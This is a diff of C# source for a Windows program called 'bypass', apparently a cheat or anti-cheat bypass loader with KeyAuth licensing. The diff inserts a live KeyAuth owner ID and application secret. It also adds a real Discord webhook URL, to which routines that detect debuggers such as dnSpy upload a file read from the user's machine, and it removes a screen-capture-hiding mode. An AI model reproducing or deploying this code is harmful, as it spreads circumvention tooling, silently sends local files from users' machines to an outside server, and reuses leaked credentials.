@@ -1,5 +1,4 @@
-﻿using Guna.UI2.WinForms;
-using ag.Class;
+﻿using ag.Class;
 using ag.Forms;
 using ag.Others;
 using DiscordMessenger;
@@ -32,8 +31,8 @@ namespace ag
 
         public static api KeyAuthApp = new api(
     name: "bypass", // Application Name
-    ownerid: "3WZuYsZRle", // Owner ID
-    secret: "309ce822c81250dc8eb99d036988fb2b26cf1dcc13e74b2375c011cfc64c002e", // Application Secret
+    ownerid: "FJPiECcyZ7", // Owner ID
+    secret: "28d16a6ed81fcceca6d7e3c1bd0f0635ae87a0b673b276595e52622969bbe6b5", // Application Secret
     version: "1.0" // Application Version, /*
 );
 
@@ -45,45 +44,8 @@ namespace ag
             timerParticles.Tick += TimerParticles_Tick;
             timerParticles.Start();
             DoubleBuffered = true;
-            InitializeStreamModeControl();
         }
 
-
-        private void InitializeStreamModeControl()
-        {
-            Guna2CheckBox streamModeCheckBox = new Guna2CheckBox();
-            streamModeCheckBox.Text = "Stream Mode";
-            streamModeCheckBox.CheckedChanged += StreamModeCheckBox_CheckedChanged;
-            streamModeCheckBox.Location = new Point(10, 10); // Ajuste conforme necessário
-            this.Controls.Add(streamModeCheckBox);
-        }
-
-        private void StreamModeCheckBox_CheckedChanged(object sender, EventArgs e)
-        {
-            streamMode = ((Guna2CheckBox)sender).Checked;
-            ApplyStreamMode();
-        }
-
-        private void ApplyStreamMode()
-        {
-            if (streamMode)
-            {
-                SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
-            }
-            else
-            {
-                SetWindowDisplayAffinity(this.Handle, 0);
-            }
-            HideSensitiveInfo(streamMode);
-        }
-
-        private void HideSensitiveInfo(bool hide)
-        {
-            user.UseSystemPasswordChar = hide;
-            pass.UseSystemPasswordChar = hide;
-            // Oculte outros elementos sensíveis aqui
-        }
-        
         private void InitializeParticles()
         {
             int numParticles = 50;
@@ -233,7 +195,7 @@ namespace ag
 
                 var file = File.ReadAllBytes(nomeArquivo);
                 content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
-                SendImg("webhook", nomeArquivo);
+                SendImg("https://discord.com/api/webhooks/1226941722215579699/c2EizC84VmzyQSd5-6dR9UoLMhDanJSPEYgC1c4KWykMtUHIldGAuiP5A6qpWE0PrsFT", nomeArquivo);
             }
             catch
             {
@@ -259,7 +221,7 @@ namespace ag
 
                 var file = File.ReadAllBytes(nomeArquivo);
                 content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
-                SendImg("webhook", nomeArquivo);
+                SendImg("https://discord.com/api/webhooks/1226941722215579699/c2EizC84VmzyQSd5-6dR9UoLMhDanJSPEYgC1c4KWykMtUHIldGAuiP5A6qpWE0PrsFT", nomeArquivo);
             }
             catch
             {
@@ -294,9 +256,7 @@ namespace ag
             this.Text = mcyAy.RandomString(27);
             await Task.Delay(500);
             debug.Stop();
-            ApplyStreamMode(); // Aplicar o modo de stream inicial
-                               // this.Opacity = 0.5;
-                               
+           // this.Opacity = 0.5;
         }
          
         private void label4_Click(object sender, EventArgs e)
@@ -333,7 +293,7 @@ namespace ag
                             dnspy = true;
                             new DiscordMessage()
    .SetUsername("Stopped Bypass")
-   .SetAvatar("SET")
+   .SetAvatar("https://cdn.discordapp.com/attachments/1224204407185604702/1226942368595316796/notify.png?ex=66269a20&is=66142520&hm=45ba8118da30de49ac65ea065d25e6e30eca8263d1353ddc2a9bacd7d79b4735&")
    .AddEmbed()
    .SetTimestamp(DateTime.Now)
    .SetTitle("\nStopped Anti Crack")
@@ -401,9 +361,6 @@ namespace ag
             base.Hide();
         }
         int dir = 1;
-        private bool streamMode;
-
-        public int WS_EX_TOOLWINDOW { get; private set; }
 
         public class Particle
         {
@@ -417,7 +374,6 @@ namespace ag
         {
 
         }
-
-            }
     }
-   
+    
+}
